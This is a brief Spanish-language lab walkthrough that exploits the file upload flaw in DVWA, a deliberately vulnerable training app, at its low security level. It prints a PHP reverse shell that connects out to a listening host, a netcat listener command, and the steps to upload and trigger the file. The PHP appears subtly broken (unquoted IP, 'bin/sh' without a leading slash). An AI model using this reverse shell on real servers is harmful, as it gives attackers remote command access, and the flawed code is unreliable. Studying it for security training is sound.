# File Upload

La vulnerabilidad **File Upload** se produce cuando una aplicación web incorpora archivos externos en sus operaciones basadas en la entrada proporcionada por el usuario sin validar adecuadamente la entrada. \
Esto puede permitir a los atacantes manipular el contenido de los archivos incluidos o incluso ejecutar código malicioso.
En esta sección se lleva a cabo un ejemplo de ataque utilizando esta vulnerabilidad.

## Level: Low
```
<?php

$ip=192.168.5.137; #IP del servidor DVWA
$port=9001; #Puerto de escucha
$sock=fsockopen($ip, $port);
exec("bin/sh -i <&3 >&3 2>&3");

?>
```

Se carga este archivo desde el cargador del servidor.

Ahora se crea un listener con **netcat**, que será donde se tendra acceso al servidor atacado (DVWA).

```
nc -lvnp 9001
```

Luego, desde la barra de direcciones se puede ejecutar el archivo malicioso.

